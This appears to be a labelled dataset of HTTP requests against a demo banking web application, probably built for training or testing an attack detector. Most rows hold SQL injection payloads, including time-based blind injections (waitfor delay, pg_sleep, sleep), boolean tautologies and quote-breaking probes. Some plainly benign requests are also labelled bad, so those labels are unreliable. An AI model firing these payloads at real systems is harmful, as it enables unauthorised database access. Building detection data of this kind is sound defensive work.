POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=1'""&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1);%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=%5c&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=rpT1R3rf';select%20pg_sleep(6);%20--%20,1,0,1,1,3,3,bad
POST,/doLogin,"btnSubmit=Login&passw=%bf'%bf""&uid=1",1,1,0,0,0,1,bad
GET,/search.jsp?query=-1;%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1""%20OR%202%2b964-964-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z",0,2,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=iwvl9mSh';%20waitfor%20delay%20'0:0:6'%20--%20&name=ckwiadcj&subject=1,3,0,1,0,5,2,bad
GET,/survey_questions.jsp?step=b%25'%20AND%202*3*8=6*8%20AND%20'MnHy'!='MnHy%25,,4,0,0,0,4,0,bad
GET,/subscribe.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%5c&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=JyI=&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b910-910)%20or%20'6N78EPpD'='&uid=1,4,0,0,1,4,1,bad
GET,/index.jsp?content=-1%20OR%202%2b774-774-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b350-350-1=0%2b0%2b0%2b1&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=WJqyQazT&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b376-376-1=0%2b0%2b0%2b1%20--%20&subject=1,0,0,1,0,4,0,bad
GET,/survey_questions.jsp?step=b'%20AND%202*3*8=6*8%20AND%20'vIBC'='vIBC,,4,0,0,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z&subject=1",0,2,0,5,0,1,bad
GET,/index.jsp?content=E86iPFjW,,0,0,0,0,0,0,bad
GET,/index.jsp?content=Tke1HiYa'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b18-18-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=sDlldLMi';%20waitfor%20delay%20'0:0:6'%20--%20,3,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%40%40LAgrU&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=JyI=&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=%bf'%bf""&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=0""XOR(if(now()=sysdate()%2csleep(10)%2c0))XOR""Z&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,2,0,5,0,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=lmSedIkd';select%20pg_sleep(9);%20--%20,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=BCC0EPDK';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,3,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=BNJqHggD');select%20pg_sleep(6);%20--%20&subject=1,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=if(now()=sysdate()%2csleep(3)%2c0),0,0,0,4,0,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1));select%20pg_sleep(6);%20--%20,0,0,1,1,3,3,bad
GET,/swagger,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/",2,2,0,15,0,9,bad
GET,/search.jsp?query=-1;select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%f0''%f0""""&name=yqyvkaxo&subject=1",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%5c&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI=,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;select%20pg_sleep(3);%20--%20,0,0,1,1,3,3,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
GET,/search.jsp?query=JyI=,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=%5c,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=iDRZ8biN'));select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'""%2b(select(0)from(select(sleep(9)))v)%2b""*/",2,2,0,15,0,9,bad
GET,/swagger/properties.json,,0,0,0,0,0,0,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1'""",1,1,0,0,0,1,bad
GET,/survey_questions.jsp,,0,0,0,0,0,2,bad
POST,/sendFeedback,submit=Submit&cfile=NZvNTzGR'));select%20pg_sleep(10);%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=qSHSncdC&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
GET,/index.jsp?content=JyI=,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=%40%40EqgWT,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=%bf'%bf""",1,1,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=BVaAyU50'));select%20pg_sleep(3);%20--%20,1,0,1,1,3,3,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1""%20OR%202%2b717-717-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,4,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=RY0k269y'));select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,bad
GET,/search.jsp?query=fes6MWtF'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b921-921-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,4,1,bad
GET,/search.jsp?query=%40%40QKG3k,,0,0,0,0,0,0,bad
GET,/search.jsp?query=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1%20OR%202%2b447-447-1=0%2b0%2b0%2b1,0,0,0,0,2,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20527=527%20AND%203%2b1-1-1=1%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=0'XOR(if(now()=sysdate()%2csleep(7)%2c0))XOR'Z&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,0,5,0,1,bad
GET,/retirement.htm,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
GET,/index.jsp?content=%5c,,0,0,0,0,0,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=%f0''%f0""""",2,2,0,0,0,0,bad
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=personal_loans.htm'%20AND%202*3*8=6*8%20AND%20'eMPA'='eMPA,,4,0,0,0,4,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=-1""%20OR%202%2b751-751-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%bf'%bf""",1,1,0,0,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2b5%2b580-580)%20--%20&name=ckwiadcj&subject=1,0,0,1,1,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b863-863-1=0%2b0%2b0%2b1%20--%20&subject=1,1,0,1,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=JyI=&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%40email.tst,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b350-350-1=0%2b0%2b0%2b1&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=1%00%c0%a7%c0%a2%252527%252522&uid=1,0,0,0,0,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=NGrVN4VM';select%20pg_sleep(6);%20--%20&subject=1,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,2,0,0,5,0,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1));select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,1,3,2,bad
GET,/survey_questions.jsp?step=if(now()=sysdate()%2csleep(3)%2c0),,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,1,3,2,bad
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=if(now()=sysdate()%2csleep(9)%2c0),0,0,0,4,0,1,bad
GET,/index.jsp?content=rlMdnOi0';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=(select(0)from(select(sleep(10)))v)/*'%2b(select(0)from(select(sleep(10)))v)%2b'""%2b(select(0)from(select(sleep(10)))v)%2b""*/&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",2,2,0,15,0,9,bad
GET,/search.jsp?query=if(now()=sysdate()%2csleep(6)%2c0),,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst%25'%20AND%202*3*8=6*8%20AND%20't4v9'!='t4v9%25&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=xpBGuR7r'));select%20pg_sleep(9);%20--%20&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=arVzSnJi';%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,3,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=-1""%20OR%202%2b773-773-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,1,1,0,4,0,bad
